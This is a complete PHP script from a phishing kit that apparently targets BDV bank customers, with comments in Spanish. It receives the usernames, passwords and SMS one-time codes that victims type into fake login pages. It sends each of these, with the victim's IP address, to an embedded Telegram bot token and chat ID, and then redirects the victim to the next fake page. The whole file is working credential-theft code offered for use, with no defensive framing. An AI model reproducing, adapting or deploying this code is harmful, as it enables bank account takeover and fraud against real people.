<?php
error_reporting(0);

// --- CONFIGURACIÓN ---
$token = "8633195178:AAHUqFzATCfwhlkXNjs47e3G6dQwBTPLf-I";
$chat_id = "6134463880";
$ip = $_SERVER['REMOTE_ADDR'];

// --- DETECCIÓN DE DATOS ---

// CASO A: Recibe el Token/Código (Viene de cargando.html)
if (isset($_POST['codigo_sms'])) {
    $codigo = $_POST['codigo_sms'];
    $mensaje = "🔢 *NUEVO TOKEN BDV*\n";
    $mensaje .= "✅ Código: `" . $codigo . "`\n";
    $mensaje .= "🌐 IP: " . $ip;

    enviarTelegram($token, $chat_id, $mensaje);

    header("Location: validando.html");

    exit();
}

// CASO B: Recibe Acceso Inicial (Viene de index.html)
if (isset($_POST['username']) && isset($_POST['password'])) {
    $usuario = $_POST['username'];
    $password = $_POST['password'];

    $mensaje = "🔥 *ACCESO CAPTURADO* 🔥\n";
    $mensaje .= "👤 Usuario: `" . $usuario . "`\n";
    $mensaje .= "🔑 Clave: `" . $password . "`\n";
    $mensaje .= "🌐 IP: " . $ip;

    enviarTelegram($token, $chat_id, $mensaje);

    header("Location: cargando.html");
    exit();
}

// --- FUNCIÓN DE ENVÍO CORREGIDA ---
function enviarTelegram($token, $chat_id, $mensaje) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($mensaje) . "&parse_mode=Markdown";
    file_get_contents($url);
}
?>
